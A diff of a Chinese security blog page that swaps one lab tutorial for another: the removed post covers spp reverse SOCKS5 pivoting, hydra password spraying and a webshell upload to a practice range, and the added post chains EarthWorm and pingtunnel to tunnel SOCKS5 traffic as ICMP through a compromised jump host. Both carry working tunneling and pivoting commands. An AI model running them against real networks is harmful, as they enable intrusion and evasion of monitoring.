@@ -1,19 +1,19 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="拓扑图 目标机器搭建了一个BEES靶场。\n使用kali上传webshell上线BEES靶场。\n靶机展示 kali攻击机\ncentos 7 跳板机\nwindows server 2012 目标机器\n使用场景 当你拿到一台服务器（linux/windows）之后，发现目标机器有两个网卡，这时候可以直接在这台机器上上传一些信息收集工具，收集到另一个网段也有web服务。这时候就可以使用这种方式，使用socks5进行反向代理到内网，在攻击机器（kali）上直接可以访问目标网站，进行渗透测试。\n使用简单方便，可以更快的对目标网站进行渗透测试。\n">
-<title>【socks 5反向代理】spp内网穿透工具的使用</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="ew+pingtunnel组合建立scoks5隧道 介绍 1 2 3 EarthWorm是一款用于开启 SOCKS v5 代理服务的工具，基于标准 C 开发，可提供多平台间的转接通讯，用于复杂网络环境下的数据转发。 Pingtunnel 是一种通过 ICMP 发送 TCP/UDP 流量的工具。其是最流行的一款ICMP代理工具，提供对tcp/udp/sock5流量伪装成icmp流量进行转发的功能。 需要root或者administrator/system权限。 环境 A攻击机器：windows11（自己的电脑）（10.10.10.131）\nB代理机器（VPS，服务端）：kali（10.10.10.133）\nC跳板机器：windwos Server 2012（已攻入的服务器）（20.20.20.134，10.10.10.135）\nD目标机器：centos 7（20.20.20.130）（搭建了一个小皮靶场）\n">
+<title>【ICMP协议隧道代理】ew&#43;pingtunnel组合建立scoks5隧道</title>
 
-<link rel='canonical' href='http://localhost:1313/p/socks-5%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86spp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/'>
+<link rel='canonical' href='http://localhost:1313/p/icmp%E5%8D%8F%E8%AE%AE%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86ew-pingtunnel%E7%BB%84%E5%90%88%E5%BB%BA%E7%AB%8Bscoks5%E9%9A%A7%E9%81%93/'>
 
-<link rel="stylesheet" href="/scss/style.min.3f80c356f93d6cdfe696883a3b8ecd0c4ad7670e02d4ec7b7c0fcf6cf9bbe703.css"><meta property='og:title' content="【socks 5反向代理】spp内网穿透工具的使用">
-<meta property='og:description' content="拓扑图 目标机器搭建了一个BEES靶场。\n使用kali上传webshell上线BEES靶场。\n靶机展示 kali攻击机\ncentos 7 跳板机\nwindows server 2012 目标机器\n使用场景 当你拿到一台服务器（linux/windows）之后，发现目标机器有两个网卡，这时候可以直接在这台机器上上传一些信息收集工具，收集到另一个网段也有web服务。这时候就可以使用这种方式，使用socks5进行反向代理到内网，在攻击机器（kali）上直接可以访问目标网站，进行渗透测试。\n使用简单方便，可以更快的对目标网站进行渗透测试。\n">
-<meta property='og:url' content='http://localhost:1313/p/socks-5%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86spp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/'>
+<link rel="stylesheet" href="/scss/style.min.3f80c356f93d6cdfe696883a3b8ecd0c4ad7670e02d4ec7b7c0fcf6cf9bbe703.css"><meta property='og:title' content="【ICMP协议隧道代理】ew+pingtunnel组合建立scoks5隧道">
+<meta property='og:description' content="ew+pingtunnel组合建立scoks5隧道 介绍 1 2 3 EarthWorm是一款用于开启 SOCKS v5 代理服务的工具，基于标准 C 开发，可提供多平台间的转接通讯，用于复杂网络环境下的数据转发。 Pingtunnel 是一种通过 ICMP 发送 TCP/UDP 流量的工具。其是最流行的一款ICMP代理工具，提供对tcp/udp/sock5流量伪装成icmp流量进行转发的功能。 需要root或者administrator/system权限。 环境 A攻击机器：windows11（自己的电脑）（10.10.10.131）\nB代理机器（VPS，服务端）：kali（10.10.10.133）\nC跳板机器：windwos Server 2012（已攻入的服务器）（20.20.20.134，10.10.10.135）\nD目标机器：centos 7（20.20.20.130）（搭建了一个小皮靶场）\n">
+<meta property='og:url' content='http://localhost:1313/p/icmp%E5%8D%8F%E8%AE%AE%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86ew-pingtunnel%E7%BB%84%E5%90%88%E5%BB%BA%E7%AB%8Bscoks5%E9%9A%A7%E9%81%93/'>
 <meta property='og:site_name' content='SlimerのBlog'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-09-11T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-09-11T00:00:00&#43;00:00'/><meta property='og:image' content='http://localhost:1313/images/60.webp' />
-<meta name="twitter:title" content="【socks 5反向代理】spp内网穿透工具的使用">
-<meta name="twitter:description" content="拓扑图 目标机器搭建了一个BEES靶场。\n使用kali上传webshell上线BEES靶场。\n靶机展示 kali攻击机\ncentos 7 跳板机\nwindows server 2012 目标机器\n使用场景 当你拿到一台服务器（linux/windows）之后，发现目标机器有两个网卡，这时候可以直接在这台机器上上传一些信息收集工具，收集到另一个网段也有web服务。这时候就可以使用这种方式，使用socks5进行反向代理到内网，在攻击机器（kali）上直接可以访问目标网站，进行渗透测试。\n使用简单方便，可以更快的对目标网站进行渗透测试。\n"><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='http://localhost:1313/images/60.webp' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-09-12T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-09-12T00:00:00&#43;00:00'/><meta property='og:image' content='http://localhost:1313/images/62.webp' />
+<meta name="twitter:title" content="【ICMP协议隧道代理】ew+pingtunnel组合建立scoks5隧道">
+<meta name="twitter:description" content="ew+pingtunnel组合建立scoks5隧道 介绍 1 2 3 EarthWorm是一款用于开启 SOCKS v5 代理服务的工具，基于标准 C 开发，可提供多平台间的转接通讯，用于复杂网络环境下的数据转发。 Pingtunnel 是一种通过 ICMP 发送 TCP/UDP 流量的工具。其是最流行的一款ICMP代理工具，提供对tcp/udp/sock5流量伪装成icmp流量进行转发的功能。 需要root或者administrator/system权限。 环境 A攻击机器：windows11（自己的电脑）（10.10.10.131）\nB代理机器（VPS，服务端）：kali（10.10.10.133）\nC跳板机器：windwos Server 2012（已攻入的服务器）（20.20.20.134，10.10.10.135）\nD目标机器：centos 7（20.20.20.130）（搭建了一个小皮靶场）\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://localhost:1313/images/62.webp' />
     <link rel="shortcut icon" href="/favicon.ico" />
 
     </head>
@@ -232,13 +232,7 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ul>
-    <li><a href="#拓扑图">拓扑图</a></li>
-    <li><a href="#靶机展示">靶机展示</a></li>
-    <li><a href="#使用场景">使用场景</a></li>
-    <li><a href="#攻击步骤">攻击步骤</a></li>
-    <li><a href="#步骤一">步骤一</a></li>
-    <li><a href="#步骤二">步骤二</a></li>
-    <li><a href="#步骤三">步骤三</a></li>
+    <li><a href="#ewpingtunnel组合建立scoks5隧道">ew+pingtunnel组合建立scoks5隧道</a></li>
   </ul>
 </nav>
         </div>
@@ -253,9 +247,9 @@
     <article class="has-image main-article">
     <header class="article-header">
         <div class="article-image">
-            <a href="/p/socks-5%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86spp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/">
+            <a href="/p/icmp%E5%8D%8F%E8%AE%AE%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86ew-pingtunnel%E7%BB%84%E5%90%88%E5%BB%BA%E7%AB%8Bscoks5%E9%9A%A7%E9%81%93/">
                 
-                    <img src="/images/60.webp" loading="lazy" alt="Featured image of post 【socks 5反向代理】spp内网穿透工具的使用" />
+                    <img src="/images/62.webp" loading="lazy" alt="Featured image of post 【ICMP协议隧道代理】ew&#43;pingtunnel组合建立scoks5隧道" />
                 
             </a>
         </div>
@@ -275,7 +269,7 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/socks-5%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86spp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/">【socks 5反向代理】spp内网穿透工具的使用</a>
+            <a href="/p/icmp%E5%8D%8F%E8%AE%AE%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86ew-pingtunnel%E7%BB%84%E5%90%88%E5%BB%BA%E7%AB%8Bscoks5%E9%9A%A7%E9%81%93/">【ICMP协议隧道代理】ew&#43;pingtunnel组合建立scoks5隧道</a>
         </h2>
     
         
@@ -299,10 +293,10 @@
   <path d="M7 3v4" />
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
-</svg>2025年09月11日</time>
+</svg>2025年09月12日</time>
                 <span class="article-word-count">
                     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M14 2H6a2 2 0 0 0 -2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2 -2V8z" /><polyline points="14 2 14 8 20 8" /><line x1="16" y1="13" x2="8" y2="13" /><line x1="16" y1="17" x2="8" y2="17" /><polyline points="10 9 9 9 8 9" /></svg>
-                    文章共1330字
+                    文章共852字
                 </span>
             </div>
 			
@@ -321,136 +315,8 @@
     <section class="article-content">
     
     
-    <h1 id="拓扑图">拓扑图</h1>
-<p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131018.png" alt="image.png"><br>
-目标机器搭建了一个BEES靶场。<br>
-<strong>使用kali上传webshell上线BEES靶场。</strong></p>
-<h1 id="靶机展示">靶机展示</h1>
-<p><strong>kali攻击机</strong><br>
-<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131112.png" alt="image.png"><br>
-<strong>centos 7 跳板机</strong><br>
-<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131121.png" alt="image.png"><br>
-<strong>windows server 2012  目标机器</strong><br>
-<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131131.png" alt="image.png"></p>
-<h1 id="使用场景">使用场景</h1>
-<p>当你拿到一台服务器（linux/windows）之后，发现目标机器有两个网卡，这时候可以直接在这台机器上上传一些信息收集工具，收集到另一个网段也有web服务。这时候就可以使用这种方式，使用socks5进行反向代理到内网，在攻击机器（kali）上直接可以访问目标网站，进行渗透测试。<br>
-使用简单方便，可以更快的对目标网站进行渗透测试。</p>
-<h1 id="攻击步骤">攻击步骤</h1>
-<p>1.kali对跳板机进行一次密码喷洒，获取跳板机的ssh登录密码，登录到跳板机后，对靶机进行一次信息收集。（发现靶机有两个网卡，并发现20段的主机20.20.20.129主机开启了80端口。）然后我们需要用kali，进攻20段主机，这时候是不通的，无法进攻。这时候我们就需要设置一个代理spp，监听8888端口。实现socks5代理。<br>
-2.上传spp到跳板机上，然后在kali上运行spp，让他作为服务端进行启动。监听8888端口，然后centos的spp反向连接kali的8888端口，然后kali服务端与centos进行协商通讯，1080端口作为socks5代理，在kali上监听，在kali上设置代理，就可以直接与20段进行通讯，对内部网络进行渗透。</p>
-<h1 id="步骤一">步骤一</h1>
-<p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131228.png" alt="image.png"></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">使用hydra对跳板机进行密码喷洒，获取ssh密码，并登录到跳板机上。
-</span></span><span class="line"><span class="cl">使用spp，以服务器的形式开启kali的8888端口进行监听。
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131256.png" alt="image.png"><br>
-<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131300.png" alt="image.png"></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">使用spp，以服务器的形式开启kali的8888端口进行监听。
-</span></span><span class="line"><span class="cl">./spp -type server -proto tcp -listen :8888 -proto ricmp -listen 0.0.0.0 -nolog 1 -noprint 1 &amp;
-</span></span><span class="line"><span class="cl">以服务器的形式运行，协议为tcp，监听8888端口，封装到ricmp协议，在本地进行监听 不保存日志，不在控制台打印日志，在后台运行。
-</span></span><span class="line"><span class="cl">同时kali机器监听8888端口。
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>如下图，spp已经成功监听8888端口。<br>
-<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131325.png" alt="image.png"></p>
-<h1 id="步骤二">步骤二</h1>
-<p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131339.png" alt="image.png"><br>
-可以使kali通过socks5代理直接访问20段的web网站</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">使用scp命令，把spp上传到跳板机上的tmp目录下:
-</span></span><span class="line"><span class="cl">scp spp root@10.10.10.128:/tmp
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131356.png" alt="image.png"></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">到跳板机上查看tmp目录，发现已经成功上传
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131409.png" alt="image.png"></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">在跳板机上运行spp，开启socks5代理，连接spp服务器kali的spp服务器8888端口上，以1080端口进行通信
-</span></span><span class="line"><span class="cl">./spp -name “16” -type reverse_socks5_client -server 10.10.10.129:8888 -fromaddr :1080 -proxyproto tcp -proto tcp -nolog 1 -noprint 1 &amp;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131422.png" alt="image.png"></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">这时候kali上就会出现监听1080端口
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131432.png" alt="image.png"></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">设置socks 5代理
-</span></span><span class="line"><span class="cl">vim /etc/proxychains4.conf
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131446.png" alt="image.png"></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">测试一下是否代理成功。
-</span></span><span class="line"><span class="cl">proxychains rdesktop 20.20.20.129
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131458.png" alt="image.png"></p>
-<h1 id="步骤三">步骤三</h1>
-<p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131507.png" alt="image.png"><br>
-在目标网站中进行渗透测试，上传webshell，拿下目标服务器。上线蚁剑</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">目标服务器有一个web靶场，这是我搭建的一个靶场，该靶场存在一个任意文件上传漏洞，可以通过改Content-Type:image/png，进行上传php文件。
-</span></span><span class="line"><span class="cl">这里上传过程就不展示了，详细靶场情况可以参考，BEES靶场通过教程
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131524.png" alt="image.png"><br>
-<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131528.png" alt="image.png"><br>
-<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131532.png" alt="image.png"><br>
-获取到上传文件地址之后，就可以使用webshell连接工具直接连接了，这里有很多工具，就不说了，我这里使用的蚁剑进行连接，需要注意的是需要用蚁剑进行socks5代理进行连接上线<br>
-我这里用burp进行socks5代理了，就直接代理8080端口了。</p>
+    <h1 id="ewpingtunnel组合建立scoks5隧道">ew+pingtunnel组合建立scoks5隧道</h1>
+<h2 id="介绍">介绍</h2>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -458,13 +324,97 @@
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">直接添加上传文件地址，输入密码，即可连接</span>
-</span></span><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">20.20</span><span class="o">.</span><span class="mf">20.129</span><span class="o">/</span><span class="n">upload</span><span class="o">/</span><span class="n">img</span><span class="o">/</span><span class="mf">20240606101139614.</span><span class="n">php</span>
-</span></span><span class="line"><span class="cl"><span class="err">到这一步我们已经成功的上线目标服务器了。</span>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">EarthWorm是一款用于开启 SOCKS v5 代理服务的工具，基于标准 C 开发，可提供多平台间的转接通讯，用于复杂网络环境下的数据转发。
+</span></span><span class="line"><span class="cl">Pingtunnel 是一种通过 ICMP 发送 TCP/UDP 流量的工具。其是最流行的一款ICMP代理工具，提供对tcp/udp/sock5流量伪装成icmp流量进行转发的功能。
+</span></span><span class="line"><span class="cl">需要root或者administrator/system权限。
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131559.png" alt="image.png"><br>
-<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131603.png" alt="image.png"></p>
+</div><h2 id="环境">环境</h2>
+<p>A攻击机器：windows11（自己的电脑）（<strong>10.10.10.131</strong>）<br>
+B代理机器（VPS，服务端）：kali（<strong>10.10.10.133</strong>）<br>
+C跳板机器：windwos Server 2012（已攻入的服务器）（<strong>20.20.20.134，10.10.10.135</strong>）<br>
+D目标机器：centos 7（<strong>20.20.20.130</strong>）（搭建了一个小皮靶场）</p>
+<h2 id="实验效果">实验效果</h2>
+<p>在已经拿到公网win7服务器的前提下，通过ew与pingtunnel搭建能通往winserver2008的隧道，获取winserver2008的服务器权限。</p>
+<h2 id="实验准备">实验准备</h2>
+<p>工具：ew、pingtunnel、proxifer（代理工具）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://github.com/idlefire/ew
+</span></span><span class="line"><span class="cl">https://github.com/esrrhs/pingtunnel
+</span></span><span class="line"><span class="cl">proxifer官网自行下载
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="实验步骤">实验步骤</h2>
+<h3 id="b代理机器执行">B代理机器执行</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./ew_for_linux64 -s rcsocks -l 10080 -e 8898
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>10080作为连接隧道的端口，8898作为隧道的通道，可以想象为，通向内网主机的路口为10080，走的这条路为8898。8898上所有的人（流量）都会通往10080这个路口。</strong><br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250912132739.png" alt="image.png"></p>
+<h3 id="b代理机器执行-1">B代理机器执行</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./pingtunnel -type server -noprint 1 -nolog 1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>意思是将ew启动的sock5协议转换为icmp协议来隐藏传输</strong><br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250912132900.png" alt="image.png"></p>
+<h3 id="c跳板机器执行">C跳板机器执行</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pingtunnel.exe -type client -l 127.0.0.1:9999 -s 10.10.10.133 -t 10.10.10.133:8898 -sock5 -1 -noprint 1 -nolog 1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">10.10.10.133：为VPS地址。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>意思是8898这条路上的sock5流量信息隐藏为icmp类型的数据在本C跳板机的9999端口进行转发。</strong><br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250912133238.png" alt="image.png"></p>
+<h3 id="c跳板机器执行-1">C跳板机器执行</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ew.exe -s rssocks -d 127.0.0.1 -e 9999
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>在本C跳板机9999端口开启转发流量</strong><br>
+如果出现错误，请以<strong>管理员身份</strong>运行即可。<br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250912133258.png" alt="image.png"></p>
+<h3 id="kali上出现ok字样时表示代理搭建完成">kali上出现OK字样时表示代理搭建完成</h3>
+<p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250912133354.png" alt="image.png"><br>
+使用A机器（自己的机器）win11，进行代理端口：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">10.10.10.133 10080 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250912133335.png" alt="image.png"><br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250912133858.png" alt="image.png"><br>
+成功访问到D目标机器小皮面板。<br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250912134124.png" alt="image.png"></p>
 
 </section>
 
@@ -489,18 +439,18 @@
             
                 
 <article class="has-image">
-    <a href="/p/icmp%E5%8D%8F%E8%AE%AE%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86ew-pingtunnel%E7%BB%84%E5%90%88%E5%BB%BA%E7%AB%8Bscoks5%E9%9A%A7%E9%81%93/">
+    <a href="/p/socks-5%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86spp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/">
         
         
             <div class="article-image">
                 
-                    <img src="/images/62.webp" loading="lazy" data-key="" data-hash="/images/62.webp"/>
+                    <img src="/images/60.webp" loading="lazy" data-key="" data-hash="/images/60.webp"/>
                 
             </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">【ICMP协议隧道代理】ew&#43;pingtunnel组合建立scoks5隧道</h2>
+            <h2 class="article-title">【socks 5反向代理】spp内网穿透工具的使用</h2>
         </div>
     </a>
 </article>
